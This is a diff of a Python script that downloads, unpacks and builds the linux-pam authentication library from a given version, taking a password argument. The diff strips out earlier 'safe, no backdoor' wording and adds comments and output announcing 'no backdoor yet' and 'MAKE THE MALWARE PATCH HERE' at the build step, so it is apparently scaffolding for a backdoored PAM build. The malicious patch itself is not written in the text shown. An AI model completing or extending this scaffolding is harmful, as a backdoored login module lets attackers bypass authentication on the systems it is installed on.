@@ -6,7 +6,7 @@ import subprocess
 import tarfile
 from pathlib import Path
 
-PAM_BASE_URL = f"https://github.com/linux-pam/linux-pam/releases/download/v{version}"
+# PAM_BASE_URL = f"https://github.com/linux-pam/linux-pam/releases/download/v{version}"
 
 def show_help():
     print("")
@@ -66,6 +66,8 @@ def build_pam(pam_dir: str):
     print("[+] Running ./configure")
     run_cmd(["./configure"], cwd=str(pam_path))
 
+    #FIGURE OUT HOW TO ACTUALLY WRITE THE PATCH
+
     print("[+] Running make")
     run_cmd(["make"], cwd=str(pam_path))
 
@@ -74,42 +76,41 @@ def build_pam(pam_dir: str):
 def main():
     parser = argparse.ArgumentParser(add_help=False)
     parser.add_argument("-h", action="store_true")
-    parser.add_argument("-?", dest="qmark", action="store_true")
+    # parser.add_argument("-?", dest="qmark", action="store_true")
     parser.add_argument("-v", dest="pam_version")
     parser.add_argument("-p", dest="password")
+    args = parser.parse_args()
 
-    args, unknown = parser.parse_known_args()
+    version = args.pam_version
+    password = args.password
+    # args, unknown = parser.parse_known_args()
 
-    if args.h or args.qmark:
-        show_help()
-        return
-
-    if not args.pam_version:
-        print("[!] PAM version is required.")
-        show_help()
-        raise SystemExit(1)
-
-    if not args.password:
-        print("[!] Password is required (treated as plain input here, no patching).")
-        show_help()
-        raise SystemExit(1)
-
-    pam_version = args.pam_version
-    password = args.password  # Not used for any modification here
-
-    print("Automatic PAM Workflow (safe, no backdoor)")
-    print(f"PAM Version: {pam_version}")
-    print(f"Password (unused in this safe version): {password}")
+    print("Automatic PAM Workflow (testing, no backdoor yet :3)")
+    print(f"PAM Version: {version}")
+    print(f"Password: {password}")
     print("")
 
-    # Check for 'patch' just like the original, but only to mirror behavior
+    global PAM_BASE_URL
+    PAM_BASE_URL = f"https://github.com/linux-pam/linux-pam/releases/download/v{version}"
+
+    try:
+        pam_dir, pam_file = try_download(version)
+    except RuntimeError as e:
+        print(f"[!] downlaod no worky: {e}")
+        return
+
+    print(f"[+] Downloaded: {pam_file}")
+    print(f"[+] Extract directory: {pam_dir}")
+
+    # Check for patch
     result = subprocess.run(["which", "patch"])
     if result.returncode != 0:
-        print("Error: patch command not found. Exiting (mirroring original script behavior)...")
+        print("Error: patch command not found. Exiting")
         raise SystemExit(1)
 
-    pam_dir, pam_file = try_download(pam_version)
+    # unpacks downloaded source archive
     extract_tarball(pam_file)
+    # runs the build process on the extracted source (MAKE THE MALWARE PATCH HERE)
     build_pam(pam_dir)
 
 if __name__ == "__main__":
